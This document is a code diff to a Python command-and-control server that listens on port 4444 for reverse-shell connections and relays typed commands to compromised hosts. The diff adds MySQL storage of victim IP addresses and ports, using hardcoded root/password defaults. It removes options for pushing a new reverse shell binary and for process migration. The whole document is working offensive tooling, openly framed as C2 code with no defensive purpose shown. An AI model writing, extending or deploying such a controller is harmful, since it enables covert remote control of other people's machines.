@@ -1,9 +1,65 @@
 import socket
 import threading
 import os
+import mysql.connector
+from modules.config_handler import load_config
+
+# Load database configuration from the config file
+db_config = load_config().get("db_config", {
+    "host": "localhost",
+    "user": "root",
+    "password": "password",
+    "database": "c2_database",
+})
 
 # Global list to maintain connected clients
 connected_clients = []
+
+# Database connection
+def get_db_connection():
+    try:
+        conn = mysql.connector.connect(**db_config)
+        return conn
+    except mysql.connector.Error as err:
+        print(f"[ERROR] MySQL Connection Error: {err}")
+        return None
+
+# Save host to database
+def save_host_to_db(ip, port):
+    conn = get_db_connection()
+    if not conn:
+        return
+
+    cursor = conn.cursor()
+    try:
+        cursor.execute(
+            "INSERT INTO hosts (ip_address, port) VALUES (%s, %s)",
+            (ip, port),
+        )
+        conn.commit()
+        print(f"[INFO] Saved host {ip}:{port} to database.")
+    except mysql.connector.Error as err:
+        print(f"[ERROR] Failed to save host to database: {err}")
+    finally:
+        cursor.close()
+        conn.close()
+
+# Fetch all hosts from database
+def fetch_hosts_from_db():
+    conn = get_db_connection()
+    if not conn:
+        return []
+
+    cursor = conn.cursor(dictionary=True)
+    try:
+        cursor.execute("SELECT * FROM hosts")
+        return cursor.fetchall()
+    except mysql.connector.Error as err:
+        print(f"[ERROR] Failed to fetch hosts: {err}")
+        return []
+    finally:
+        cursor.close()
+        conn.close()
 
 # Listener setup
 def start_listener(host="0.0.0.0", port=4444):
@@ -19,6 +75,7 @@ def start_listener(host="0.0.0.0", port=4444):
         client_socket, client_address = server.accept()
         print(f"[INFO] Connection established with {client_address}")
         connected_clients.append((client_socket, client_address))
+        save_host_to_db(client_address[0], client_address[1])
         threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
 
 # Handle client communication
@@ -67,67 +124,30 @@ def c2_interface():
         for idx, (_, client_address) in enumerate(connected_clients, 1):
             print(f"{idx}.) {client_address}")
 
-        if not connected_clients:
-            print("[INFO] No connected clients.")
+        db_hosts = fetch_hosts_from_db()
+        print("\n[ Hosts in Database ]")
+        for host in db_hosts:
+            print(f"ID: {host['id']}, IP: {host['ip_address']}, Port: {host['port']}")
+
+        if not connected_clients and not db_hosts:
+            print("[INFO] No connected clients or database hosts.")
             break
 
         try:
-            choice = int(input("Select a client by number (or 0 to exit): "))
+            choice = int(input("Select a connected client by number (or 0 to exit): "))
             if choice == 0:
                 break
-
             client_socket, client_address = connected_clients[choice - 1]
             print(f"[INFO] Selected client: {client_address}")
 
             while True:
-                print("\n[ Client Options ]")
-                print("1.) Send Command")
-                print("2.) Update Reverse Shell Binary")
-                print("3.) Migrate Process")
-                print("4.) Exit to Main Menu")
-
-                sub_choice = input("Enter your choice: ")
-
-                if sub_choice == "1":
-                    command = input(f"C2@{client_address}> ")
-                    if command.lower() == "exit":
-                        print("[INFO] Returning to client menu.")
-                        break
-
-                    client_socket.send(command.encode("utf-8"))
-                    response = client_socket.recv(4096).decode("utf-8")
-                    print(response)
-
-                elif sub_choice == "2":
-                    binary_path = input("Enter the path to the updated binary: ")
-                    if not os.path.exists(binary_path):
-                        print("[ERROR] File not found.")
-                        continue
-
-                    try:
-                        with open(binary_path, "rb") as binary_file:
-                            binary_data = binary_file.read()
-
-                        client_socket.send(b"update_binary")
-                        client_socket.send(len(binary_data).to_bytes(4, "big"))
-                        client_socket.send(binary_data)
-                        print("[INFO] Reverse shell binary updated successfully.")
-                    except Exception as e:
-                        print(f"[ERROR] Failed to update binary: {e}")
-
-                elif sub_choice == "3":
-                    pid = input("Enter the target process ID to migrate to: ")
-                    client_socket.send(f"migrate {pid}".encode("utf-8"))
-                    response = client_socket.recv(1024).decode("utf-8")
-                    print(f"[INFO] Migration result: {response}")
-
-                elif sub_choice == "4":
+                command = input(f"C2@{client_address}> ")
+                if command.lower() == "exit":
                     print("[INFO] Returning to main menu.")
                     break
-
-                else:
-                    print("[ERROR] Invalid choice. Try again.")
-
+                client_socket.send(command.encode("utf-8"))
+                response = client_socket.recv(4096).decode("utf-8")
+                print(response)
         except (IndexError, ValueError):
             print("[ERROR] Invalid selection. Try again.")
 
